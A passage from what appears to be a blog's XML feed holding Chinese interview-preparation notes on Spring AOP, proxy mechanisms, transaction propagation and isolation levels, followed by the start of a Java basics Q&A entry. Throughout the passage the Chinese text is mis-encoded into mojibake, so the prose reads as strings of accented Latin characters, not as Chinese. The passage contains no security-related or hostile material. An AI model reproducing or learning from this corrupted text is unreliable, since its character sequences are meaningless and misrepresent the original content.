id="å…³æ³¨ç‚¹åˆ†ç¦»ä¸åŒçš„é—®é¢˜äº¤ç»™ä¸åŒçš„éƒ¨åˆ†å»è§£å†³">å…³æ³¨ç‚¹åˆ†ç¦»ï¼šä¸åŒçš„é—®é¢˜äº¤ç»™ä¸åŒçš„éƒ¨åˆ†å»è§£å†³</span></h2><p>Ã˜ é¢å‘åˆ‡é¢ç¼–ç¨‹AOPæ­£æ˜¯æ­¤ç§æŠ€æœ¯çš„ä½“ç°</p><p>Ã˜ é€šç”¨åŒ–åŠŸèƒ½ä»£ç çš„å®ç°ï¼Œå¯¹åº”çš„å°±æ˜¯æ‰€è°“çš„åˆ‡é¢ï¼ˆAspectï¼‰</p><p>Ã˜ ä¸šåŠ¡åŠŸèƒ½ä»£ç å’Œåˆ‡é¢ä»£ç åˆ†å¼€åï¼Œæ¶æ„å°†å˜å¾—é«˜å†…èšä½è€¦åˆ</p><p>Ã˜ ç¡®ä¿åŠŸèƒ½çš„å®Œæ•´æ€§ï¼šåˆ‡é¢æœ€ç»ˆéœ€è¦è¢«åˆå¹¶åˆ°ä¸šåŠ¡ä¸­ï¼ˆWeaveï¼‰</p><h2><span id="aopçš„ä¸‰ç§ç»‡å…¥æ–¹å¼">AOPçš„ä¸‰ç§ç»‡å…¥æ–¹å¼</span></h2><p>Ã˜ ç¼–è¯‘æ—¶ç»‡å…¥ï¼šéœ€è¦ç‰¹æ®Šçš„Javaç¼–è¯‘å™¨ï¼Œå¦‚AspectJ</p><p>Ã˜ ç±»åŠ è½½æ—¶ç»‡å…¥ï¼šéœ€è¦ç‰¹æ®Šçš„Javaç¼–è¯‘å™¨ï¼Œå¦‚AspectJå’ŒAspectWerkz</p><p>Ã˜ è¿è¡Œæ—¶ç»‡å…¥ï¼šSpringé‡‡ç”¨çš„æ–¹å¼ï¼Œé€šè¿‡åŠ¨æ€ä»£ç†çš„æ–¹å¼ï¼Œå®ç°ç®€å•</p><h2><span id="aopçš„ä¸»è¦åè¯æ¦‚å¿µ">AOPçš„ä¸»è¦åè¯æ¦‚å¿µ</span></h2><p>Ã˜ Aspectï¼šé€šç”¨åŠŸèƒ½çš„ä»£ç å®ç°</p><p>Ã˜ Target:è¢«ç»‡å…¥Aspectçš„å¯¹è±¡</p><p>Ã˜ Join Pointï¼šå¯ä»¥ä½œä¸ºåˆ‡å…¥ç‚¹çš„æœºä¼šï¼Œæ‰€æœ‰æ–¹æ³•éƒ½å¯ä»¥ä½œä¸ºåˆ‡å…¥ç‚¹</p><p>Ã˜ Pointcutï¼šAspectå®é™…è¢«åº”ç”¨åœ¨çš„Join Pointï¼Œæ”¯æŒæ­£åˆ™</p><p>Ã˜ Adviceï¼šç±»é‡Œçš„æ–¹æ³•ä»¥åŠè¿™ä¸ªæ–¹æ³•å¦‚ä½•ç»‡å…¥åˆ°ç›®æ ‡æ–¹æ³•çš„æ–¹å¼</p><p>Ã˜ Weavingï¼šAOPçš„å®ç°è¿‡ç¨‹</p><h2><span id="adviceçš„ç§ç±»">Adviceçš„ç§ç±»</span></h2><p>Ã˜ å‰ç½®é€šçŸ¥ï¼ˆBeforeï¼‰</p><p>Ã˜ åç½®é€šçŸ¥ï¼ˆAfterReturningï¼‰</p><p>Ã˜ å¼‚å¸¸é€šçŸ¥ï¼ˆAfterThrowingï¼‰</p><p>Ã˜ æœ€ç»ˆé€šçŸ¥ï¼ˆAfterï¼‰</p><p>Ã˜ ç¯ç»•é€šçŸ¥ï¼ˆAroundï¼‰</p><h2><span id="aopçš„å®ç°jdkproxyå’Œcglib">AOPçš„å®ç°ï¼šjdkProxyå’ŒCglib</span></h2><p>Ã˜ ç”±AopProxyFactoryæ ¹æ®AdvisedSupportå¯¹è±¡çš„é…ç½®æ¥å†³å®š</p><p>Ã˜ é»˜è®¤ç­–ç•¥å¦‚æœç›®æ ‡ç±»æ˜¯æ¥å£ï¼Œåˆ™ç”¨JDKProxyæ¥å®ç°ï¼Œå¦åˆ™ç”¨åè€…</p><p>Ã˜ JDKProxyçš„æ ¸å¿ƒï¼šInvocationHandleræ¥å£å’ŒProxyç±»</p><p>Ã˜ Cglibï¼šä»¥ç»§æ‰¿çš„æ–¹å¼åŠ¨æ€ç”Ÿæˆç›®æ ‡ç±»çš„ä»£ç†</p><p>Ã˜ JDKProxyï¼šé€šè¿‡Javaçš„å†…éƒ¨åå°„æœºåˆ¶å®ç°</p><p>Ã˜ Cglibï¼šå€ŸåŠ©ASMå®ç°</p><p>Ã˜ åå°„æœºåˆ¶åœ¨ç”Ÿæˆç±»çš„è¿‡ç¨‹ä¸­æ¯”è¾ƒé«˜æ•ˆ</p><p>Ã˜ ASMåœ¨ç”Ÿæˆç±»ä¹‹åçš„æ‰§è¡Œè¿‡ç¨‹ä¸­æ¯”è¾ƒé«˜æ•ˆ</p><p><strong><font color="orange">ä»£ç†æ¨¡å¼ï¼šæ¥å£+çœŸå®å®ç°ç±»+ä»£ç†ç±»</font></strong></p><p> <img src="/2020/03/23/spring-concept/image-20200406163709120.png"></p><p><img src="/2020/03/23/spring-concept/image-20200406163712301.png"></p><p><img src="/2020/03/23/spring-concept/image-20200406163716479.png"></p><p><img src="/2020/03/23/spring-concept/image-20200406163734578.png"></p><h2><span id="springé‡Œä»£ç†æ¨¡å¼çš„å®ç°">Springé‡Œä»£ç†æ¨¡å¼çš„å®ç°</span></h2><p>Ã˜ çœŸå®å®ç°ç±»çš„é€»è¾‘åŒ…å«åœ¨getBeanæ–¹æ³•é‡Œ</p><p>Ã˜ getBeanæ–¹æ³•è¿”å›çš„å®é™…ä¸Šæ˜¯Proxyçš„å®ä¾‹</p><p>Ã˜ Proxyå®ä¾‹æ˜¯Springé‡‡ç”¨JDK Proxyæˆ–CglibåŠ¨æ€ç”Ÿæˆçš„</p><p><img src="/2020/03/23/spring-concept/image-20200406163746413.png"></p><h2><span id="äº‹åŠ¡ä¼ æ’­">äº‹åŠ¡ä¼ æ’­</span></h2><p>1.PROPAGATION_REQUIRED(é»˜è®¤å®ç°)ï¼šå½“å‰æ²¡æœ‰äº‹åŠ¡åˆ™æ–°å»ºäº‹åŠ¡ï¼Œæœ‰åˆ™åŠ å…¥å½“å‰äº‹åŠ¡</p><p>2.PROPAGATION_SUPPORTSï¼šæ”¯æŒå½“å‰äº‹åŠ¡ï¼Œå¦‚æœå½“å‰æ²¡æœ‰äº‹åŠ¡åˆ™ä»¥éäº‹åŠ¡æ–¹å¼æ‰§è¡Œ</p><p>3.PROPAGATION_MANDATORYï¼šä½¿ç”¨å½“å‰äº‹åŠ¡ï¼Œå¦‚æœæ²¡æœ‰åˆ™æŠ›å‡ºå¼‚å¸¸</p><p>4.PROPAGATION__REQUIRES_NEWï¼šæ–°å»ºäº‹åŠ¡ï¼Œå¦‚æœå½“å‰æœ‰äº‹åŠ¡åˆ™æŠŠå½“å‰äº‹åŠ¡æŒ‚èµ·</p><p>5.PROPAGATION_NOT_SUPPORTEDï¼šä»¥éäº‹åŠ¡çš„æ–¹å¼æ‰§è¡Œï¼Œå¦‚æœå½“å‰æœ‰äº‹åŠ¡åˆ™æŠŠå½“å‰äº‹åŠ¡æŒ‚èµ·</p><p>6.PROPAGATION_NEVERï¼šä»¥éäº‹åŠ¡çš„æ–¹å¼æ‰§è¡Œï¼Œå¦‚æœå½“å‰æœ‰äº‹åŠ¡åˆ™æŠ›å‡ºå¼‚å¸¸</p><p>7.PROPAGATION_NESTEDï¼šå¦‚æœå½“å‰å­˜åœ¨äº‹åŠ¡ï¼Œåˆ™åœ¨åµŒå¥—äº‹åŠ¡å†…æ‰§è¡Œï¼Œå¦‚æœå½“å‰æ²¡æœ‰äº‹åŠ¡ï¼Œåˆ™æ‰§è¡Œ1</p><table><thead><tr><th>éš”ç¦»çº§åˆ«</th><th>æè¿°</th></tr></thead><tbody><tr><td>DEFAULT</td><td>ä½¿ç”¨æ•°æ®åº“æœ¬èº«ä½¿ç”¨çš„éš”ç¦»çº§åˆ« ORACLEï¼ˆè¯»å·²æäº¤ï¼‰ MySQLï¼ˆå¯é‡å¤è¯»ï¼‰</td></tr><tr><td>READ_UNCOMITTED</td><td>è¯»æœªæäº¤ï¼ˆè„è¯»ï¼‰æœ€ä½çš„éš”ç¦»çº§åˆ«ï¼Œä¸€åˆ‡çš†æœ‰å¯èƒ½ã€‚</td></tr><tr><td>READ_COMMITED</td><td>è¯»å·²æäº¤ï¼ŒORACLEé»˜è®¤éš”ç¦»çº§åˆ«ï¼Œæœ‰å¹»è¯»ä»¥åŠä¸å¯é‡å¤è¯»é£é™©ã€‚</td></tr><tr><td>REPEATABLE_READ</td><td>å¯é‡å¤è¯»ï¼Œè§£å†³ä¸å¯é‡å¤è¯»çš„éš”ç¦»çº§åˆ«ï¼Œä½†è¿˜æ˜¯æœ‰å¹»è¯»é£é™©ã€‚</td></tr><tr><td>SERLALIZABLE</td><td>ä¸²è¡ŒåŒ–ï¼Œæœ€é«˜çš„äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼Œä¸ç®¡å¤šå°‘äº‹åŠ¡ï¼ŒæŒ¨ä¸ªè¿è¡Œå®Œä¸€ä¸ªäº‹åŠ¡çš„æ‰€æœ‰å­äº‹åŠ¡ä¹‹åæ‰å¯ä»¥æ‰§è¡Œå¦å¤–ä¸€ä¸ªäº‹åŠ¡é‡Œé¢çš„æ‰€æœ‰å­äº‹åŠ¡ï¼Œè¿™æ ·å°±è§£å†³äº†è„è¯»ã€ä¸å¯é‡å¤è¯»å’Œå¹»è¯»çš„é—®é¢˜äº†</td></tr></tbody></table><h2><span id="ä»€ä¹ˆæ˜¯aop">ä»€ä¹ˆæ˜¯AOP</span></h2><p>åœ¨ç¼–è¯‘æ—¶ï¼Œç±»åŠ è½½æ—¶æˆ–è¿è¡Œæ—¶å°†é€šç”¨ä»£ç åˆ‡å…¥åˆ°ç±»çš„æŒ‡å®šæ–¹æ³•ã€æŒ‡å®šä½ç½®ä¸Šçš„ç¼–ç¨‹æ€æƒ³å°±æ˜¯é¢å‘åˆ‡é¢çš„ç¼–ç¨‹ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> é¢è¯• </category>
          
      </categories>
      
      
        <tags>
            
            <tag> spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JavaåŸºç¡€é¢è¯•é¢˜</title>
      <link href="/2020/03/23/javaQA/"/>
      <url>/2020/03/23/javaQA/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>æ•´ç†äº†ç½‘ä¸Šçš„åŸºç¡€çš„Javaé¢è¯•é¢˜ï¼Œå¯¹äºä¸€äº›é¢˜ç›®æœ‰æ‰€åˆ æ”¹ï¼Œå› ä¸ºå¯èƒ½å’Œä¹‹åå†™çš„æ–‡ç« é‡å¤ã€‚</p><span id="more"></span><!-- toc --><ul><li><a href="#%E9%9D%A2%E5%90%91%E5%AF%B9%E8%B1%A1%E7%9A%84%E7%89%B9%E7%82%B9%E6%9C%89%E5%93%AA%E4%BA%9B">é¢å‘å¯¹è±¡çš„ç‰¹ç‚¹æœ‰å“ªäº›ï¼Ÿ</a></li><li><a href="#%E6%8E%A5%E5%8F%A3%E5%92%8C%E6%8A%BD%E8%B1%A1%E7%B1%BB%E6%9C%89%E4%BB%80%E4%B9%88%E8%81%94%E7%B3%BB%E5%92%8C%E5%8C%BA%E5%88%AB">æ¥å£å’ŒæŠ½è±¡ç±»æœ‰ä»€ä¹ˆè”ç³»å’ŒåŒºåˆ«</a></li><li><a href="#%E9%87%8D%E8%BD%BD%E5%92%8C%E9%87%8D%E5%86%99%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">é‡è½½å’Œé‡å†™æœ‰ä»€ä¹ˆåŒºåˆ«</a></li><li><a href="#java%E6%9C%89%E5%93%AA%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">javaæœ‰å“ªäº›åŸºæœ¬æ•°æ®ç±»å‹ï¼Ÿ</a></li><li><a href="#int%E5%92%8Cinteger%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">intå’ŒIntegeræœ‰ä»€ä¹ˆåŒºåˆ«</a></li><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E8%87%AA%E5%8A%A8%E6%8B%86%E8%A3%85%E7%AE%B1">ä»€ä¹ˆæ˜¯è‡ªåŠ¨æ‹†è£…ç®±</a></li><li><a href="#%E6%95%B0%E7%BB%84%E6%9C%89%E6%B2%A1%E6%9C%89length%E6%96%B9%E6%B3%95string%E6%9C%89%E6%B2%A1%E6%9C%89length%E6%96%B9%E6%B3%95">æ•°ç»„æœ‰æ²¡æœ‰length()æ–¹æ³•ï¼ŸStringæœ‰æ²¡æœ‰length()æ–¹æ³•ï¼Ÿ</a></li><li><a href="#string%E5%92%8Cstringbuilder-stringbuffer%E7%9A%84%E5%8C%BA%E5%88%AB">Stringå’ŒStringBuilderã€StringBufferçš„åŒºåˆ«ï¼Ÿ</a></li><li><a href="#string%E8%83%BD%E8%A2%AB%E7%BB%A7%E6%89%BF%E5%90%97%E4%B8%BA%E4%BB%80%E4%B9%88">Stringèƒ½è¢«ç»§æ‰¿å—ï¼Ÿä¸ºä»€ä¹ˆï¼Ÿ</a></li><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E5%80%BC%E4%BC%A0%E9%80%92%E5%92%8C%E5%BC%95%E7%94%A8%E4%BC%A0%E9%80%92">ä»€ä¹ˆæ˜¯å€¼ä¼ é€’å’Œå¼•ç”¨ä¼ é€’</a></li><li><a href="#java%E7%B1%BB%E7%9A%84%E5%AE%9E%E4%BE%8B%E5%8C%96%E9%A1%BA%E5%BA%8F">Javaç±»çš„å®ä¾‹åŒ–é¡ºåº</a></li><li><a href="#java%E4%B8%AD%E7%AC%A6%E5%8F%B7%E5%92%8C%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">Javaä¸­ç¬¦å·&gt;&gt;å’Œ&gt;&gt;&gt;æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</a></li><li><a href="#java%E9%9B%86%E5%90%88%E6%A1%86%E6%9E%B6%E7%9A%84%E5%9F%BA%E7%A1%80%E6%8E%A5%E5%8F%A3%E6%9C%89%E5%93%AA%E4%BA%9B">Javaé›†åˆæ¡†æ¶çš„åŸºç¡€æ¥å£æœ‰å“ªäº›ï¼Ÿ</a></li><li><a href="#arraylist-%E5%92%8C-linkedlist-%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">ArrayList å’Œ LinkedList æœ‰ä»€ä¹ˆåŒºåˆ«?</a></li><li><a href="#hashmap-%E4%B8%8Ehashtable%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">HashMap ä¸HashTableæœ‰ä»€ä¹ˆåŒºåˆ«</a><ul><li><a href="#hashtable"><strong>HashTable</strong></a></li><li><a href="#hashmap"><strong>HashMap</strong></a></li></ul></li><li><a href="#final-finally-finalize%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">final, finally, finalizeæœ‰ä»€ä¹ˆåŒºåˆ«</a></li><li><a href="#java%E4%B8%AD%E7%9A%84throw-%E5%92%8C-throws%E5%85%B3%E9%94%AE%E5%AD%97%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">javaä¸­çš„throw å’Œ throwså…³é”®å­—æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ</a></li><li><a href="#oom%E5%8E%9F%E5%9B%A0%E6%9C%89%E5%93%AA%E4%BA%9B%E5%A6%82%E4%BD%95%E8%A7%A3%E5%86%B3">OOMåŸå› æœ‰å“ªäº›ï¼Œå¦‚ä½•è§£å†³ï¼Ÿ</a></li><li><a href="#jdk8-%E6%96%B0%E7%89%B9%E6%80%A7">JDK8 æ–°ç‰¹æ€§</a></li><li><a href="#jvmjdk%E5%92%8Cjre%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB%E4%B8%8E%E8%81%94%E7%B3%BB">JVMï¼ŒJDKå’ŒJREæœ‰ä»€ä¹ˆåŒºåˆ«ä¸è”ç³»</a></li><li><a href="#%E5%88%86%E5%88%AB%E5%86%99%E5%87%BA%E5%A0%86%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA%E4%B8%8E%E6%A0%88%E5%86%85%E5%AD%98%E6%BA%A2%E5%87%BA%E7%9A%84%E7%A8%8B%E5%BA%8F">åˆ†åˆ«å†™å‡ºå †å†…å­˜æº¢å‡ºä¸æ ˆå†…å­˜æº¢å‡ºçš„ç¨‹åº</a></li><li><a href="#dump%E6%96%87%E4%BB%B6%E7%9A%84%E4%BD%9C%E7%94%A8%E6%98%AF%E4%BB%80%E4%B9%88%E5%A6%82%E4%BD%95%E8%8E%B7%E5%8F%96%E7%BA%BF%E7%A8%8B%E7%9A%84dump%E6%96%87%E4%BB%B6">dumpæ–‡ä»¶çš„ä½œç”¨æ˜¯ä»€ä¹ˆï¼Ÿå¦‚ä½•è·å–çº¿ç¨‹çš„dumpæ–‡ä»¶?</a></li><li><a href="#synchronized%E4%BB%80%E4%B9%88%E6%83%85%E5%86%B5%E4%B8%8B%E4%BC%9A%E9%87%8A%E6%94%BE%E9%94%81">synchronizedä»€ä¹ˆæƒ…å†µä¸‹ä¼šé‡Šæ”¾é”</a></li><li><a href="#%E8%A7%A3%E9%87%8A%E4%B8%80%E4%B8%8B%E9%94%81%E7%9A%84%E4%B8%80%E4%BA%9B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5%E5%8F%AF%E9%87%8D%E5%85%A5%E9%94%81-%E5%8F%AF%E4%B8%AD%E6%96%AD%E9%94%81-%E5%85%AC%E5%B9%B3%E9%94%81-%E8%AF%BB%E5%86%99%E9%94%81">è§£é‡Šä¸€ä¸‹é”çš„ä¸€äº›åŸºæœ¬æ¦‚å¿µï¼šå¯é‡å…¥é”ã€å¯ä¸­æ–­é”ã€å…¬å¹³é”ã€è¯»å†™é”</a></li><li><a href="#java%E7%BA%BF%E7%A8%8B%E5%90%8C%E6%AD%A5%E7%9A%84%E6%96%B9%E5%BC%8F%E6%9C%89%E5%93%AA%E4%BA%9B">Javaçº¿ç¨‹åŒæ­¥çš„æ–¹å¼æœ‰å“ªäº›</a></li><li><a href="#%E4%BB%80%E4%B9%88%E6%98%AF%E7%BA%BF%E7%A8%8B%E5%AE%89%E5%85%A8">ä»€ä¹ˆæ˜¯çº¿ç¨‹å®‰å…¨ï¼Ÿ</a></li><li><a href="#java%E7%BC%96%E5%86%99%E4%B8%80%E4%B8%AA%E4%BC%9A%E5%AF%BC%E8%87%B4%E6%AD%BB%E9%94%81%E7%9A%84%E7%A8%8B%E5%BA%8F">Javaç¼–å†™ä¸€ä¸ªä¼šå¯¼è‡´æ­»é”çš„ç¨‹åºï¼Ÿ</a></li><li><a href="#%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8Brunnable%E5%92%8Ccallable%E7%9A%84%E5%8C%BA%E5%88%AB%E5%92%8C%E7%94%A8%E6%B3%95">ç®€å•ä»‹ç»ä¸€ä¸‹Runnableå’ŒCallableçš„åŒºåˆ«å’Œç”¨æ³•</a></li><li><a href="#java%E6%9C%89%E5%93%AA%E5%87%A0%E7%A7%8D%E5%88%9B%E5%BB%BA%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%9A%84%E6%96%B9%E5%BC%8F">Javaæœ‰å“ªå‡ ç§åˆ›å»ºå¤šçº¿ç¨‹çš„æ–¹å¼ï¼Ÿ</a></li><li><a href="#cyclibarriar%E5%92%8Ccountdownlatch%E6%9C%89%E4%BB%80%E4%B9%88%E5%8C%BA%E5%88%AB">CycliBarriarå’ŒCountdownLatchæœ‰ä»€ä¹ˆåŒºåˆ«?</a></li><li><a href="#%E7%BA%BF%E7%A8%8B%E6%B1%A0%E7%9A%84%E4%BD%9C%E7%94%A8%E6%9C%89%E5%93%AA%E4%BA%9B">çº¿ç¨‹æ± çš„ä½œç”¨æœ‰å“ªäº›ï¼Ÿ</a></li><li><a href="#java-%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E7%9A%84%E4%BD%9C%E7%94%A8">Java åå°„æœºåˆ¶çš„ä½œç”¨</a></li><li><a href="#%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%E6%9C%89%E5%93%AA%E4%BA%9B%E4%BC%98%E7%82%B9%E5%92%8C%E7%BC%BA%E7%82%B9">åå°„æœºåˆ¶æœ‰å“ªäº›ä¼˜ç‚¹å’Œç¼ºç‚¹</a></li><li><a href="#%E5%8F%8D%E5%B0%84%E5%88%9B%E5%BB%BA%E7%B1%BB%E5%AE%9E%E4%BE%8B%E7%9A%84%E4%B8%89%E7%A7%8D%E6%96%B9%E5%BC%8F">åå°„åˆ›å»ºç±»å®ä¾‹çš„ä¸‰ç§æ–¹å¼</a></li><li><a href="#jdk%E8%87%AA%E5%B8%A6%E4%BA%86%E5%93%AA%E4%BA%9B%E6%B3%A8%E8%A7%A3%E6%9C%89%E4%BB%80%E4%B9%88%E4%BD%9C%E7%94%A8">jdkè‡ªå¸¦äº†å“ªäº›æ³¨è§£ï¼Œæœ‰ä»€ä¹ˆä½œç”¨</a></li><li><a href="#%E6%9E%84%E9%80%A0%E5%99%A8constructor%E6%98%AF%E5%90%A6%E5%8F%AF%E8%A2%AB%E9%87%8D%E5%86%99override">æ„é€ å™¨ï¼ˆconstructorï¼‰æ˜¯å¦å¯è¢«é‡å†™ï¼ˆoverrideï¼‰</a></li><li><a href="#%E4%B8%A4%E4%B8%AA%E5%AF%B9%E8%B1%A1%E5%80%BC%E7%9B%B8%E5%90%8Cxequalsy-true%E4%BD%86%E5%8D%B4%E5%8F%AF%E6%9C%89%E4%B8%8D%E5%90%8C%E7%9A%84hash-code%E8%BF%99%E5%8F%A5%E8%AF%9D%E5%AF%B9%E4%B8%8D%E5%AF%B9">ä¸¤ä¸ªå¯¹è±¡å€¼ç›¸åŒ(x.equals(y) &#x3D;&#x3D; true)ï¼Œä½†å´å¯æœ‰ä¸åŒçš„hash codeï¼Œè¿™å¥è¯å¯¹ä¸å¯¹ï¼Ÿ</a></li><li><a href="#char-%E5%9E%8B%E5%8F%98%E9%87%8F%E4%B8%AD%E8%83%BD%E4%B8%8D%E8%83%BD%E5%AD%98%E8%B4%AE%E4%B8%80%E4%B8%AA%E4%B8%AD%E6%96%87%E6%B1%89%E5%AD%97%E4%B8%BA%E4%BB%80%E4%B9%88">char å‹å˜é‡ä¸­èƒ½ä¸èƒ½å­˜è´®ä¸€ä¸ªä¸­æ–‡æ±‰å­—ï¼Œä¸ºä»€ä¹ˆï¼Ÿ</a></li><li><a href="#%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8Bg1%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E9%9B%86%E5%99%A8%E7%9A%84%E7%89%B9%E7%82%B9%E5%8F%8A%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6%E8%BF%87%E7%A8%8B">ä»‹ç»ä¸€ä¸‹G1åƒåœ¾å›æ”¶é›†å™¨çš„ç‰¹ç‚¹ï¼ŒåŠåƒåœ¾å›æ”¶è¿‡ç¨‹</a></li></ul><!-- tocstop --><h2><span id="é¢å‘å¯¹è±¡çš„ç‰¹ç‚¹æœ‰å“ªäº›">é¢å‘å¯¹è±¡çš„ç‰¹ç‚¹æœ‰å“ªäº›ï¼Ÿ</span></h2><p>1.å°è£…</p><p>åœ¨ä¸€ä¸ªç±»çš„å†…éƒ¨ï¼ŒæŸäº›å±æ€§å’Œæ–¹æ³•æ˜¯ç§æœ‰çš„ï¼Œä¸èƒ½è¢«å¤–ç•Œæ‰€è®¿é—®ã€‚é€šè¿‡è¿™ç§æ–¹å¼ï¼Œå¯¹è±¡å¯¹å†…éƒ¨æ•°æ®è¿›è¡Œäº†ä¸åŒçº§åˆ«çš„è®¿é—®æ§åˆ¶ï¼Œå°±é¿å…äº†ç¨‹åºä¸­çš„æ— å…³éƒ¨åˆ†çš„æ„å¤–æ”¹å˜æˆ–é”™è¯¯æ”¹å˜äº†å¯¹è±¡çš„ç§æœ‰éƒ¨åˆ†ã€‚</p><p>2.ç»§æ‰¿</p><p>  ç»§æ‰¿å®ç°äº† IS-A å…³ç³»ï¼Œä¾‹å¦‚ Cat å’Œ Animal å°±æ˜¯ä¸€ç§ IS-A å…³ç³»ï¼Œå› æ­¤ Cat å¯ä»¥ç»§æ‰¿è‡ª Animalï¼Œä»è€Œè·å¾— Animal é private çš„å±æ€§å’Œæ–¹æ³•ã€‚<br>ç»§æ‰¿åº”è¯¥éµå¾ªé‡Œæ°æ›¿æ¢åŸåˆ™ï¼Œå­ç±»å¯¹è±¡å¿…é¡»èƒ½å¤Ÿæ›¿æ¢æ‰æ‰€æœ‰çˆ¶ç±»å¯¹è±¡ã€‚</p><p>3.å¤šæ€</p><p> å¤šæ€åˆ†ä¸ºç¼–è¯‘æ—¶å¤šæ€å’Œè¿è¡Œæ—¶å¤šæ€ï¼š<br>â€¢ç¼–è¯‘æ—¶å¤šæ€ä¸»è¦æŒ‡æ–¹æ³•çš„é‡è½½ï¼ˆæ¯ä¸ªæ–¹æ³•å…·æœ‰ä¸åŒçš„å‚æ•°çš„ç±»å‹æˆ–å‚æ•°çš„ä¸ªæ•°ï¼‰<br>â€¢è¿è¡Œæ—¶å¤šæ€æŒ‡ç¨‹åºä¸­å®šä¹‰çš„å¯¹è±¡å¼•ç”¨æ‰€æŒ‡å‘çš„å…·ä½“ç±»å‹åœ¨è¿è¡ŒæœŸé—´æ‰ç¡®å®š<br>è¿è¡Œæ—¶å¤šæ€æœ‰ä¸‰ä¸ªæ¡ä»¶ï¼š<br>â€¢ç»§æ‰¿<br>â€¢è¦†ç›–ï¼ˆé‡å†™ï¼‰<br>â€¢å‘ä¸Šè½¬å‹</p><p>4.æŠ½è±¡</p><p>æå–ç°å®ä¸–ç•Œä¸­æŸäº‹ç‰©çš„å…³é”®ç‰¹æ€§ï¼Œä¸ºè¯¥äº‹ç‰©æ„å»ºæ¨¡å‹çš„è¿‡ç¨‹ã€‚å¾—åˆ°çš„æŠ½è±¡æ¨¡å‹ä¸­ä¸€èˆ¬åŒ…å«ï¼šå±æ€§ï¼ˆæ•°æ®ï¼‰å’Œæ–¹æ³•ï¼ˆè¡Œä¸ºï¼‰ã€‚è¿™ä¸ªæŠ½è±¡æ¨¡å‹æˆ‘ä»¬ç§°ä¹‹ä¸ºç±»ã€‚å¯¹ç±»è¿›è¡Œå®ä¾‹åŒ–å¾—åˆ°å¯¹è±¡ã€‚</p><h2><span id="æ¥å£å’ŒæŠ½è±¡ç±»æœ‰ä»€ä¹ˆè”ç³»å’ŒåŒºåˆ«">æ¥å£å’ŒæŠ½è±¡ç±»æœ‰ä»€ä¹ˆè”ç³»å’ŒåŒºåˆ«</span></h2><p><strong>ç›¸åŒç‚¹ï¼š</strong></p><p>ï¼ˆ1ï¼‰éƒ½ä¸èƒ½è¢«å®ä¾‹åŒ–</p><p>ï¼ˆ2ï¼‰æ¥å£çš„å®ç°ç±»æˆ–æŠ½è±¡ç±»çš„å­ç±»éƒ½åªæœ‰å®ç°äº†æ¥å£æˆ–æŠ½è±¡ç±»ä¸­çš„æ–¹æ³•åæ‰èƒ½å®ä¾‹åŒ–ã€‚</p><p><strong>ä¸åŒç‚¹ï¼š</strong></p><p>ï¼ˆ1ï¼‰ æ¥å£é‡Œåªèƒ½åŒ…å«æŠ½è±¡æ–¹æ³•ï¼Œé™æ€æ–¹æ³•å’Œé»˜è®¤æ–¹æ³•ï¼Œä¸èƒ½ä¸ºæ™®é€šæ–¹æ³•æä¾›æ–¹æ³•å®ç°ï¼ŒæŠ½è±¡ç±»åˆ™å®Œå…¨å¯ä»¥åŒ…å«æ™®é€šæ–¹æ³•ã€‚</p><p>ï¼ˆ2ï¼‰ æ¥å£é‡Œåªèƒ½å®šä¹‰é™æ€å¸¸é‡ï¼Œä¸èƒ½å®šä¹‰æ™®é€šæˆå‘˜å˜é‡ï¼ŒæŠ½è±¡ç±»é‡Œåˆ™æ—¢å¯ä»¥å®šä¹‰æ™®é€šæˆå‘˜å˜é‡ï¼Œä¹Ÿå¯ä»¥å®šä¹‰é™æ€å¸¸é‡ã€‚</p><p>ï¼ˆ3ï¼‰ æ¥å£ä¸èƒ½åŒ…å«æ„é€ å™¨ï¼ŒæŠ½è±¡ç±»å¯ä»¥åŒ…å«æ„é€ å™¨ï¼ŒæŠ½è±¡ç±»é‡Œçš„æ„é€ å™¨å¹¶ä¸æ˜¯ç”¨äºåˆ›å»ºå¯¹è±¡ï¼Œè€Œæ˜¯è®©å…¶å­ç±»è°ƒç”¨è¿™äº›æ„é€ å™¨æ¥å®Œæˆå±äºæŠ½è±¡ç±»çš„åˆå§‹åŒ–æ“ä½œã€‚</p><p>ï¼ˆ4ï¼‰ æ¥å£é‡Œä¸èƒ½åŒ…å«åˆå§‹åŒ–å—ï¼Œä½†æŠ½è±¡ç±»é‡Œå®Œå…¨å¯ä»¥åŒ…å«åˆå§‹åŒ–å—ã€‚</p><p>ï¼ˆ5ï¼‰ ä¸€ä¸ªç±»æœ€å¤šåªèƒ½æœ‰ä¸€ä¸ªç›´æ¥çˆ¶ç±»ï¼Œä½†ä¸€ä¸ªç±»å¯ä»¥ç›´æ¥å®ç°å¤šä¸ªæ¥å£ã€‚</p><h2><span 